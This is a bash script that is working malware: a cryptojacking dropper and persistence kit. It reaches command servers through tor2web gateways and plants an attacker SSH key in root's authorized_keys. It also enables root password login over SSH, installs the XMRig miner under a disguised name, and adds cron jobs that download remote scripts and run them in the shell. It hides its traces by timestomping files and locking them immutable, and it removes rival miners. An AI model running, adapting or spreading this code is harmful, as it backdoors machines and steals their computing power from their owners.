#!/bin/bash
SHELL=/bin/bash
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

odc="--retry 2 --connect-timeout 26 --max-time 75 -fsSLk"
odcf="--retry 2 --connect-timeout 26 --max-time 175 -fsSLkC- -o"
odw="--tries=2 --connect-timeout=26 --timeout=75 --no-check-certificate -qO-"
odwf="--tries=2 --connect-timeout=26 --timeout=175 --no-check-certificate -qcO"

function dp() { 
    if [ "$(command -v curl|wc -l)" -eq 1 ]; then
        curl ${odc} "$1" --user-agent 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36';
    elif [ "$(command -v wget|wc -l)" -eq 1 ]; then
        wget ${odw} "$1" --user-agent='Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36';
    fi
}

function dpf() {
    if [ "$(command -v curl|wc -l)" -eq 1 ]; then
        curl ${odcf} "$1" "$2" --user-agent 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36';
    elif [ "$(command -v wget|wc -l)" -eq 1 ]; then
        wget ${odwf} "$1" "$2" --user-agent='Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36';
    fi
}

uo="eknr73utr7u7bzwo"
tr1=".onion.ly"
tr2=".onion.ws"
tr3=".tor2web.su"
bd="/wp-content/"
if grep -E 'onion|tor2|github' /etc/hosts; then
    chattr -aui /etc/hosts >/dev/null 2>&1
    sed -i -e '/onion/d' -e '/tor2/d' -e '/github/d' /etc/hosts
    touch -amr "$(find /usr/bin -type f|shuf -n1)" /etc/hosts
fi
if dp "https://${uo}${tr1}${bd}"; then
    export trv="https://${uo}${tr1}${bd}"
elif dp "https://${uo}${tr2}${bd}"; then
    export trv="https://${uo}${tr2}${bd}"
elif dp "https://${uo}${tr3}${bd}"; then
    export trv="https://${uo}${tr3}${bd}"
fi
ush="${trv}J6M86V"
uks="${trv}ZOQVL"
ucf="${trv}AR9DC"
uc1="${trv}zbesIdqwQHdhG8DZF2KNBZXzZgPVTmNlYIPOYfo"
uc2="${trv}ekK9k9Yhtp8Bsul2EmftImLTq1t078ZiP36WCco"
uc3="${trv}RHNM3"
ut1="${trv}PRnsapUmg3mpEBWgsrSTjHTC0jHZQiBe59BPbF3"
ut2="${trv}ptQdGfoVDHfxFlahJ7Nfl93xpI6UDXkFV5WJTUm"
uxi='https://github.com/xmrig/xmrig/releases/download/v3.2.0/xmrig-3.2.0-xenial-x64.tar.gz'
lcf1="/dev/shm/swapfile"
lcf2="/bin/config.json"
lex="/bin/exin"
c1="/etc/cron.d/spool"
c2="/etc/crontab"
c3="/var/spool/cron/root"
c4="/etc/cron.hourly/agetty"
c5="/usr/bin/unattended-upgrades"
c6="/etc/crond"
td="/usr/local/includes"
shk="ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCzvqVju3NQ4wFNceks9uEyWfgCoMt/jfywgcjaXXuOZQG9nlmah5GVdosR9Ie7qbnTCFrUB/4YyHYu6jvu0Vk9UwlauzyJO5aVXg8Jr7cwmvG9D5alzhlKTKHZOkUsD/dXe8LC/zC4cLmZRPFs3s91A9WbXbEZi1x8pys3bIgF8PUXtnzl/vjDviFoew4NG3WlOuM0SudZ1goOj2awDm/LUGCSKcgtSenyUDockCJHhv/negYpGC9C14CepID4xB1d33Q3GL4YRwnSWPJ0ewT0butdt0foOH4t0Rv0Tz5fHq3Xkiy8EZd1pohRy8GrURC259Ndw+zKTt13KKcBOnrj"

if [ -f /root/.ssh/authorized_keys ]; then
    chattr -aui /root/.ssh/authorized_keys >/dev/null 2>&1
    sed -i '/server@localhost/d; /localhost@server/d; /admin@localhost/d; /root@ubuntu/d; /eks9uEyWfgCoMt/d' /root/.ssh/authorized_keys
else
    mkdir -p /root/.ssh
    chmod 700 /root/.ssh
    touch /root/.ssh/authorized_keys
fi
if grep -q "${shk}" /root/.ssh/authorized_keys; then
    :
else
    echo "${shk}" >>/root/.ssh/authorized_keys
    touch -amr "$(find /usr/bin -type f|shuf -n1)" /root/.ssh/authorized_keys /root/.ssh
    chattr -aui /etc/ssh >/dev/null 2>&1
    chattr -aui /etc/ssh/sshd_config /etc/hosts.deny /etc/hosts.allow >/dev/null 2>&1
    echo >/etc/hosts.deny
    echo >/etc/hosts.allow
    mkdir -p /etc/ssh
    sed -i -e 's/Port 78//g' -e 's/\#Port 22/Port 22/g' -e 's/\#PermitRootLogin/PermitRootLogin/g' -e 's/PermitRootLogin no/PermitRootLogin yes/g' -e 's/PermitRootLogin without-password/PermitRootLogin yes/g' -e 's/PermitRootLogin prohibit-password/PermitRootLogin yes/g' -e 's/PasswordAuthentication no/PasswordAuthentication yes/g' -e 's/GSSAPIAuthentication yes/GSSAPIAuthentication no/g' -e 's/GSSAPICleanupCredentials yes/GSSAPICleanupCredentials no/g' /etc/ssh/sshd_config
    chmod 600 /etc/ssh/sshd_config
    touch -amr "$(find /usr/bin -type f|shuf -n1)" /etc/ssh/sshd_config /etc/ssh
    { 
systemctl restart ssh||service ssh restart||/etc/init.d/ssh restart||/etc/init.d/sshd restart||/etc/rc.d/sshd restart||service sshd restart||scw-fetch-ssh-keys --upgrade
    } >/dev/null 2>&1
fi

if dp ${ut1}; then
    if [ "$(grep mirr ${lcf2}|wc -l)" -ne 1 ]; then
        chattr -aui ${lcf1} ${lcf2} >/dev/null 2>&1
        rm -rf ${lcf1} ${lcf2}
        dpf ${lcf1} ${ucf}
        mv -f ${lcf1} ${lcf2}
        chmod 644 ${lcf2}
        chown 0:0 ${lcf2}
        touch -amr "$(find /usr/bin -type f|shuf -n1)" ${lcf2}
        chattr +ai ${lcf2}
        pkill -9 -f ${lex}
    fi
    echo "1580e70d4573bb558d084e7e605631cd6bcfebaf80ad588fab2386050e5367e7 ${lex}"|sha256sum -c --quiet
    if [ $? -eq 1 ]; then
        eval tf="/var/tmp/$(head /dev/urandom|tr -dc A-Za-z0-9|head -c $(shuf -i 4-7 -n 1))"
        eval td="/var/tmp/$(head /dev/urandom|tr -dc A-Za-z0-9|head -c $(shuf -i 2-4 -n 1))"
        chattr -aui ${lex} /var/tmp >/dev/null 2>&1
        dpf ${tf} ${uxi}
        mkdir -p ${td}
        tar xf ${tf} --strip-components=1 -C ${td} >/dev/null 2>&1
        mv -f ${td}/*mr*g ${lex} >/dev/null 2>&1
        rm -rf ${td} ${tf}
        chmod 755 ${lex}
        chown 0:0 ${lex}
        touch -amr "$(find /usr/bin -type f|shuf -n1)" ${lex}
        chattr +ai ${lex}
        pkill -9 -f ${lex}
        sysctl -w vm.nr_hugepages=128 >/dev/null 2>&1
        ${c4} >/dev/null 2>&1
    fi
    if [ "$(grep systemd-host ${c6}|wc -l)" -ne 0 ]; then
        chattr -aui ${c6} >/dev/null 2>&1
        rm -rf ${c6}
        dpf ${c6} ${uks}
        chmod 755 ${c6}
        touch -amr "$(find /usr/bin -type f|shuf -n1)" ${c6}
        dp ${uks}|$SHELL >/dev/null 2>&1
        ${c6} >/dev/null 2>&1
    fi
    if [ "$(grep sc\outd ${c5}|wc -l)" -eq 0 ]; then
        chattr -aui ${c5} >/dev/null 2>&1
        rm -rf ${c5}
        dpf ${c5} ${ush}
        chmod 755 ${c5}
        chown 0:0 ${c5}
        touch -amr "$(find /usr/bin -type f|shuf -n1)" ${c5}
    fi
fi

chattr -aui /etc/crontab /etc/cron.d /etc/cron.d/* /var/spool /var/spool/cron /var/spool/cron/* >/dev/null 2>&1
mkdir -p /etc/cron.d /var/spool/cron
sed -i -e '/base64/d' -e '/docker/d' -e '/pastebin.com/d' -e '/gitee/d' -e '/mr.sh/d' -e '/2mr.sh/d' -e '/cr5.sh/d' -e '/logo9.jpg/d' -e '/tmpfile/d' -e' /\/usr\/local\/shared/d' -e '/aliynd-upd-service/d' -e' /aliyun-service/d' -e '/dqVBS/d' -e '/uiC5HSaS.sh/d' -e '/log_rotate/d' -e '/aliynd-upd-check/d' -e '/duckdns/d' -e '/havaged/d' -e '/scoutd/d' -e '/apachi/d' /etc/crontab
find /etc/cron.d -type f -print0|xargs -r0 sed -i -e '/base64/d' -e '/docker/d' -e '/curl/d' -e '/pastebin.com/d' -e '/gitee/d' -e '/mr.sh/d' -e '/2mr.sh/d' -e '/cr5.sh/d' -e '/logo9.jpg/d' -e '/tmpfile/d' -e '#\/usr\/local\/shared#d' -e '/aliynd-upd-service/d' -e' /aliyun-service/d' -e '/uiC5HSaS.sh/d' -e '/log_rotate/d' -e '/aliynd-upd-check/d' -e "/duckdns/d" -e '/havaged/d' -e '/scoutd/d' -e '/apachi/d'
find /var/spool/cron -type f -print0|xargs -r0 sed -i -e '/base64/d' -e '/docker/d' -e '/curl/d' -e '/pastebin.com/d' -e '/gitee/d' -e '/mr.sh/d' -e '/2mr.sh/d' -e '/cr5.sh/d' -e '/logo9.jpg/d' -e '/tmpfile/d' -e' #\/usr\/local\/shared#d' -e '/aliynd-upd-service/d' -e' /aliyun-service/d' -e '/uiC5HSaS.sh/d' -e '/log_rotate/d' -e '/aliynd-upd-check/d' -e "/duckdns/d" -e '/scoutd/d' -e '/apachi/d'
if [ -f /var/spool/mail/root ]; then
    rm -f /var/spool/mail/root
    mkdir -p /var/spool/mail/root
    touch -amr "$(find /usr/bin -type f|shuf -n1)" /var/spool/mail/root
fi
if [ "$(grep WebKit ${c1}|wc -l)" -ne 1 ]; then
    chattr -aui ${c1} >/dev/null 2>&1
    rm -rf ${c1}
    echo "MAILTO=''" >${c1}
    echo "*/19 * * * * root if [ \"\$(pgrep -f ${lex}|wc -l)\" -eq 0 ];then ${lex};fi;(curl ${odc} ${uc2} --user-agent 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36'||wget ${odw} ${uc2} --user-agent='Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36')|$SHELL >/dev/null 2>&1" >>${c1}
    touch -amr "$(find /usr/bin -type f|shuf -n1)" ${c1}
fi
if [ $(grep "MAILTO=''" ${c1}|wc -l) -ne 1 ]; then
    sed -i '/MAILTO/d' ${c1}
    sed -i "1s#^#MAILTO=''\n#g" ${c1}
    touch -amr "$(find /usr/bin -type f|shuf -n1)" ${c1}
fi
if [ "$(grep .. ${c1}|sort|uniq -cd|sort -r|wc -l)" -ne 0 ] && [ "$(command -v perl|wc -l)" -eq 1 ]; then
    perl -i -ne 'print if ! $x{$_}++' ${c1}
    touch -amr "$(find /usr/bin -type f|shuf -n1)" ${c1}
fi
if [ "$(grep WebKit ${c2}|wc -l)" -ne 1 ]; then
	sed -i "/curl/d" ${c2}
    echo "*/11 * * * * root if [ \"\$(pgrep -f ${lex}|wc -l)\" -eq 0 ];then ${lex};fi;(curl ${odc} ${uc2} --user-agent 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36'||wget ${odw} ${uc2} --user-agent='Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36')|$SHELL >/dev/null 2>&1" >>${c2}
    touch -amr "$(find /usr/bin -type f|shuf -n1)" ${c2}
fi
if [ "$(grep ${c5} ${c2}|wc -l)" -ne 2 ]; then
    echo "@reboot root ${c5} >/dev/null 2>&1" >>${c2}
    echo "0 */3 * * * root ${c5} >/dev/null 2>&1" >>${c2}
    touch -amr "$(find /usr/bin -type f|shuf -n1)" ${c2}
fi
if [ $(grep "MAILTO=''" ${c2}|wc -l) -ne 1 ]; then
    sed -i '/MAILTO/d' ${c2}
    sed -i "1s#^#MAILTO=''\n#g" ${c2}
    touch -amr "$(find /usr/bin -type f|shuf -n1)" ${c2}
fi
if [ "$(grep .. ${c2}|sort|uniq -cd|sort -r|wc -l)" -ne 0 ] && [ "$(command -v perl|wc -l)" -eq 1 ]; then
    perl -i -ne 'print if ! $x{$_}++' ${c2}
    touch -amr "$(find /usr/bin -type f|shuf -n1)" ${c2}
fi
if [ "$(grep ${uo} ${c3}|wc -l)" -ne 1 ]; then
    if [ -d ${c3} ]; then rm -rf ${c3}; fi
    echo "*/19 * * * * ${c4} >/dev/null 2>&1" >>${c3}
    touch -amr "$(find /usr/bin -type f|shuf -n1)" ${c3}
fi
if [ $(grep "MAILTO=''" ${c3}|wc -l) -ne 1 ]; then
    sed -i '/MAILTO/d' ${c3}
    sed -i "1s#^#MAILTO=''\n#g" ${c3}
    touch -amr "$(find /usr/bin -type f|shuf -n1)" ${c3}
fi
if [ "$(grep .. ${c3}|sort|uniq -cd|sort -r|wc -l)" -ne 0 ] && [ "$(command -v perl|wc -l)" -eq 1 ]; then
    perl -i -ne 'print if ! $x{$_}++' ${c3}
    touch -amr "$(find /usr/bin -type f|shuf -n1)" ${c3}
fi
if [ -f /etc/cron.d/php5.6 ]; then rm -f /etc/cron.d/php5.6; fi
if [ -f /etc/cron.d/1m ]; then rm -f /etc/cron.d/1m; fi
if [ -f /etc/cron.d/1mm ]; then rm -f /etc/cron.d/1mm; fi
if [ -f /etc/cron.d/root ]; then rm -f /etc/cron.d/root; fi
if [ -f /etc/cron.d/crontab ]; then rm -f /etc/cron.d/crontab; fi

chattr -aui ${td} >/dev/null 2>&1
if [ -d ${td} ]; then rm -rf ${td}; fi
touch -amr "$(find /usr/bin -type f|shuf -n1)" /usr/local/includes

echo "c2b7a9579176f9963d9926284018f92dcab36b6a31ddd9b4c43b6c172ee3e678 ${c4}"|sha256sum -c --quiet
if [ $? -eq 1 ]; then
    chattr -aui ${c4} >/dev/null 2>&1
    rm -rf ${c4}
    echo '#!/bin/sh' >${c4}
    echo -e "if [ \"\$(pgrep -f ${lex}|wc -l)\" -eq 0 ]; then\nnohup ${lex} >/dev/null 2>&1 &\nfi" >>${c4}
    chmod 755 ${c4}
    touch -amr "$(find /usr/bin -type f|shuf -n1)" ${c4}
fi

echo "3e367971de7532028f25634dca0f3c5cfbd81c76d0f54f3545f04b4dae8d2773 ${c5}"|sha256sum -c --quiet
if [ $? -eq 1 ]; then
    if dp ${ut1}; then
        chattr -aui ${c5} >/dev/null 2>&1
        rm -rf ${c5}
        dpf ${c5} ${ush}
        chmod 755 ${c5}
        chown 0:0 ${c5}
        touch -amr "$(find /usr/bin -type f|shuf -n1)" ${c5}
    fi
fi

if [ "$(pgrep havaged|wc -l)" -ne 0 ]; then pkill -9 -f havaged; rm -f /usr/sbin/havaged; fi
if [ "$(pgrep muhsti|wc -l)" -ne 0 ]; then shutdown -r now >/dev/null 2>&1; reboot -f >/dev/null 2>&1; fi
sysctl -w vm.nr_hugepages=128 >/dev/null 2>&1
${c4} >/dev/null 2>&1
exit 0
